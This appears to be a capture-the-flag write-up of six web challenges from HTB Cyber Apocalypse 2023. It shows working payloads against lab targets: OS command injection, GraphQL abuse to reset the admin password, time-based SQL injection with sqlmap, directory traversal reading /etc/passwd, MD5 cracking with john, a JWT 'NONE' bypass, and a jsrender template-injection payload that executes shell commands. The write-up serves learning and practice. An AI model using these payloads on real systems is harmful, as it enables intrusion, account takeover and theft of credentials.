## Trapped Source - very easy
- You need four digits to open the lock.

![source_invalid.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/source_invalid.png)
- At the source code, there is a correct pin is disclosed.

![Source_correctPin.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/Source_correctPin.png)
- By entering the correct pin the flag will appear.

![source_flag.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/source_flag.png)

---
## Gunhead - very easy
- When accessing the challenge, this page appears.
- With a little of bit interaction with the events on the page, you will find a command shell on the side.

![Gunhead.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/Gunhead.png)
 - During Checking the included files with the challenge, you will find an intetrsting source code in `ReconModel.php` Implies with os command injection vulnerability using `shell_exec()` function without sanitizing the user input.
 
![Gunhhead_shell_exec.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/Gunhhead_shell_exec.png)
- During accessing the shell, it needs to assign the current commands to start with a slash `/`. 

![Gunhead_help.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/Gunhead_help.png)
- By injecting with your commands, you will reach the flag like the following commands.
```
> /ping -c 3 127.0.0.1 || id
PING 127.0.0.1 (127.0.0.1): 56 data bytes  
uid=1000(www) gid=1000(www) groups=1000(www)

> /ping -c 3 127.0.0.1 || ls /
PING 127.0.0.1 (127.0.0.1): 56 data bytes  
bin dev etc flag.txt home lib media mnt opt proc root run sbin srv sys tmp usr var www

> /ping -c 3 127.0.0.1 || cat /flag.txt
PING 127.0.0.1 (127.0.0.1): 56 data bytes  
HTB{4lw4y5_54n1t1z3_u53r_1nput!!!}  
```

----
## Drobots - very easy
- When access the web challenge, You will find a login page.

![drobots_login.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/drobots_login.png)
- And with some source code reviewing, you will find the `database.py` file contains a `login()` function to authenticate with the user credentials, but it doesn't sanitize the inputs from the user.

![drobots_database.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/drobots_database.png)
- So we can try to inject the username field.

![drobots_bypass.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/drobots_bypass.png)
- You will access the home page with a basic SQL injection bypass.

![drobots_flag.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/drobots_flag.png)

---
## Passman - easy
- After launching the machine, The login form appeard.

![passman_login.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/passman_login.png)
- And I created an account then go back again to log in.

![passman_register.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/passman_register.png)
- After performing the authentication process, I have been transferred to the `/dashboard` endpoint, and I found this button to add a new phrase.

![passman_dashboard.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/passman_dashboard.png)
- I added a new phrase and captured it with the burp proxy.

![passman_AddPhrase.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/passman_AddPhrase.png)
- From the first time when I saw the data is sent in graphQL query in `/graphql` endpoint, I expected maybe there is a graphQL flaw.
- The query contains `AddPhrase` mutation operation to add new phrase in the database.

![passman_burp.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/passman_burp.png)

- I asked the help from [Hacktricks basic enumeration](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql#basic-enumeration) to make a little enumeration about the schema.

> The mutations in graphQL are the operations used to make changes to data on the server.

```
{"query":"{__schema{types{name,fields{name}}}}",
"variables":{
"recType":"Web",
"recAddr":"test",
"recUser":"test",
"recPass":"test",
"recNote":"test"
 }
}
```

![passman_schema.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/passman_schema.png)
- Show the response in the browser, it is more visible.

![passman_mutation.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/passman_mutation.png)
- You will find the mutation object contains some operations that we can do to data within the database. And the most prominent of them to attract us is `UpdatePassword` operation.
 - So now we need to know what are the arguments for the `UpdatePassword`.
```
{"query":"{__schema{types{name,fields{name,args{name}}}}}",
"variables":{
"recType":"Web",
"recAddr":"test",
"recUser":"test",
"recPass":"test",
"recNote":"test"
 }
}
```
- Here we have found the `username` and `password` arguments for the `UpdatePassword`.

![passman_userandpass.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/passman_userandpass.png)
- Why not update the admin password, and get IDOR(Vertical Access Control)?
- Using the `UpdatePassword` mutation we can pass the `username` and `password` variables as arguments to update the admin credentials.

```
{"query":"mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message} }",
"variables":{
"username":"admin",
"password":"admin"
  }
}
```

![passman_updatedSuccessfully.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/passman_updatedSuccessfully.png)
- Congrats, the password updated successfully, then we can log out and log in again with the credentials we created `admin:admin`.

![passman_flag.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/passman_flag.png)

---
## Orbital - easy
- When you access the challenge, you will login page.
- So the first thing comes to our mind is trying SQL injection.

![orbital_login.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/orbital_login.png)
- I tried to inject the basic payloads to bypass it, but it was useless.
- Through the included files with the challenge we can notice in the `database.py` file that the developer queries the database to retrieve the record that matches the username provided as input, and then performs password verification with the `passwordVerify()` function by comparing the provided password with the `md5` hashed password stored in the database. 

![orbital_function.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/orbital_function.png)
- The `passwordVerify()` function within the `util.py` file. 

![orbital_hash.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/orbital_hash.png)
- So I tried another solution to trigger a time delay in the server response as time-based SQL injection.
- We will inject with `MySQL` syntax as we saw in the source files, the developer imported `flask_mysqldb` library.

![orbital_PoC.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/orbital_PoC.png)
- **Here, we notice the server has taken more time to respond, and there is an over-in-time response with `10093 millis`.**
- So we can use `sqlmap` tool and try to dump any credentials from the database.
```
$ sqlmap --shell
sqlmap > -r request.req --batch --banner -p "username"
```

![orbital_SQLmap.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/orbital_SQLmap.png)
```
sqlmap > -r request.req --batch --dbms='mysql' --curren-db
current database: 'orbital'
```
- Through the results, we extracted the admin credentials.
```
sqlmap > -r request.req --batch -D orbital --dump
Database: orbital                                                                                            
Table: users
[1 entry]
+----+-------------------------------------------------+----------+
| id | password                                        | username |
+----+-------------------------------------------------+----------+
| 1  | 1692b753c031f2905b89e7258dbc49bb (ichliebedich) | admin    |
+----+-------------------------------------------------+----------+
```
- So good we accessed the home page, and we can export any communication from the table.

![orbital_home.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/orbital_home.png)
- Try to export any file from the table, and it will be downloaded.
- Why not try downloading any file from the server otherwise the communication files?

![orbital_Burp1.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/orbital_Burp1.png)
- During trying to access the `passwd` file from the server to download, you will detect there is a directory traversal vulnerability.

![orbital_Burp2.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/orbital_Burp2.png)
- But we can not to read any files from the server and we don't know any disclosed paths to acces their files or to access the flag.
- But If we displayed the `Dockerfile` which included with challenge files, we will see that it copies the `flag.txt` file to the docker image's `/signal_sleuth_firmware` file and the `files` directory to the docker image's `/communications` directory.  

![orbital_FlagFile.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/orbital_FlagFile.png)
- So now the current working directory is the `/communications` directory.
- And if we tried to access the `passwd` file again with this payload, it will access also the file:
```
../etc/passwd
```
- Then go to access the `signal_sleuth_firmware` file to get the flag.

![orbital_HTBFlag.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/orbital_HTBFlag.png)
- Pretty, we have been succeeded.

**Another way using python to retrieve the admin password**
1. We need to know the admin password length.
2. We need to retrieve the admin password.
3. Cracking the password.
```bash
$ echo "1692b753c031f2905b89e7258dbc49bb" > hash.txt
$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
ichliebedich     (?)     
1g 0:00:00:00 DONE (2023-03-23 13:46) 100.0g/s 499200p/s 499200c/s 499200C/s class08..emolove
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
---
## Didactic Octo Paddles - medium
- At the first time I found myself in the login page, but I found the `/register` endpoint is exist from the attached files with the challenge, so I created a new account and log in.

![paddle_register.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/paddle_register.png)

![paddle_login.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/paddle_login.png)
- I found some products that I can add to the cart and remove from it.
 
![paddle_AddDelete.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/paddle_AddDelete.png)

![paddle_cart.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/paddle_cart.png)
- During navigating in the attached files with the challenges, I found the application work with `node.js` as a back-end and it use a `jsrender` template, and I thought when I add any product in the cart it will render any `PoC` to be an `SSTI` vulnerability, but I falled in my fault because there is nothing to be rendered in the cart table when I add the item `id`.

![paddle_notSSTI.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/paddle_notSSTI.png)
- There is nothing the `id` value sends to render in the `jsrender` template of the `index.jsrender` file.

![paddle_addToCartFunction.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/paddle_addToCartFunction.png)
- Then I let this endpoint and went to see the `/admin` page.

![paddle_notadminpage.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/paddle_notadminpage.png)
- And it has been restricted for us as normal users already, and when I found the application work with `JWT`, I tried to test this JWT to bypass it as an admin.
- In the `AdminMiddleware.js` file I found the `AdminMiddleware` function does not validate the session cookie value correctly, it checks just for the `none` value as a case sensitive with lowercase, so we can bypass it by adding any values like as `NONE`, `None`, `NoNE` rather than `none` value, and then there is another issue is that it does not verify the signature of the token, so we bypass it by removing it from the `JWT token` value.

![paddle_noneSource.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/paddle_noneSource.png)

![paddle_NotAdmin.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/paddle_NotAdmin.png)
- If we exchanged the user `id` value with `1`, it wouldn't make us go to the admin page, it will redirect us to the `/login` page.

![paddle_redirectLogin.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/paddle_redirectLogin.png)
- So I exchanged the `none` value with `NONE` and removed the signature of the `JWT` token, and it succeded to redirect us to the admin dashboard.

![paddle_NONE.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/paddle_NONE.png)

![paddle_AdminBoard.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/paddle_AdminBoard.png)
- When I accessed the admin dashboard and reviewed the source code of the  `admin.jsrender` file, when we register with a new username, it is rendered in the admin table for the active users with the `jsrender` template.

> You can check this source, it was very helpful: [Template Injection: JsRender/JsViews](https://appcheck-ng.com/template-injection-jsrender-jsviews)

![paddle_renderUsers.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/paddle_renderUsers.png)

- So I have gone to perform a PoC to SSTI vulnerability and register with a new account as `test{{:7*7}}`

![paddle_SSTIpoc.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/paddle_SSTIpoc.png)

- And it succeeded to show `Test49` in the table of active users.

![paddle_poc49.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/paddle_poc49.png)

- Reenter this payload in the username field to register and execute commands on the target host.
```
PoC{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```

![paddle_passwd.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/paddle_passwd.png)

```
pocroot:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000:Linux User
```

- Now we need to the flag, with some navigating in the server paths, I found the flag file in the root directory path.
```
node{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('ls /').toString()")()}}
```

![paddle_node.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/paddle_node.png)

```
flag{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()")()}}
```

- Finally, we got the flag.

![paddle_flag.png](https://github.com/Sec0gh/CTF/blob/main/Cyber%20Apocalypse%202023%20-%20The%20Cursed%20Mission/Web%20images/paddle_flag.png)
